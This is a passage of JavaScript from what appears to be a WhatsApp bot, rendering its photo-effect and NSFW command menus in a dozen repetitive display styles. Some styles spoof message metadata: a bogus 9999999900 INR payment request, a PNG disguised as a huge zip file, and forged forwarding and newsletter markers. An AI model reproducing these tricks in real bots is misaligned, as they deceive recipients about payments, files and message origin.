                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'photooxymenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'nsfwmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
